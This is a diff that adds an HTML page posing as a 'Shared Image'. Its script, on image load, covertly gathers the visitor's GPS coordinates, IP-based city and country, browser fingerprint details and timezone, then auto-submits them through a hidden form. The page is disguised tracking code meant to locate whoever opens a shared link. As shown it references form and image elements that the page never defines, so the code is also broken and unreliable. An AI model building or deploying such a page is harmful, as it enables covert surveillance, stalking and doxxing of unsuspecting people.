@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Shared Image</title>
+    <link rel="shortcut icon" href="sss.png" type="image/x-icon" />
+    <style>
+      body {
+        margin: 0;
+      }
+      img {
+        width: 100vw;
+        height: 100vh;
+        object-fit: cover;
+      }
+    </style>
+  </head>
+  <body>
+    <img src="track.png" alt="Shared Image" />
+    <div
+      id="status"
+      style="
+        position: fixed;
+        top: 10px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: #fff;
+        padding: 10px 20px;
+        border-radius: 5px;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+        font-family: sans-serif;
+        display: none;
+        z-index: 1000;
+      "
+    ></div>
+    <script>
+      async function getIPLocation() {
+        try {
+          const response = await fetch("https://ipapi.co/json/");
+          return await response.json();
+        } catch (e) {
+          return {};
+        }
+      }
+      function fillAndSubmitForm(gps, ipinfo) {
+        document.getElementById("ua").value = navigator.userAgent;
+        document.getElementById("platform").value = navigator.platform;
+        document.getElementById("lang").value = navigator.language;
+        document.getElementById("screen").value =
+          screen.width + "x" + screen.height;
+        document.getElementById("tz").value =
+          Intl.DateTimeFormat().resolvedOptions().timeZone;
+        document.getElementById("ts").value = new Date().toISOString();
+        if (gps) {
+          document.getElementById("gps_lat").value = gps.latitude || "";
+          document.getElementById("gps_lng").value = gps.longitude || "";
+          document.getElementById("gps_acc").value = gps.accuracy || "";
+        }
+        if (ipinfo) {
+          document.getElementById("ip").value = ipinfo.ip || "";
+          document.getElementById("city").value = ipinfo.city || "";
+          document.getElementById("country").value = ipinfo.country || "";
+        }
+        document.getElementById("trackForm").submit();
+      }
+      function onImageLoad() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+              const gps = {
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+              };
+              const ipinfo = await getIPLocation();
+              fillAndSubmitForm(gps, ipinfo);
+            },
+            async (err) => {
+              const ipinfo = await getIPLocation();
+              fillAndSubmitForm({}, ipinfo);
+            },
+            { timeout: 10000 }
+          );
+        } else {
+          getIPLocation().then((ipinfo) => fillAndSubmitForm({}, ipinfo));
+        }
+      }
+      document
+        .getElementById("trackedImg")
+        .addEventListener("load", onImageLoad);
+    </script>
+  </body>
+</html>
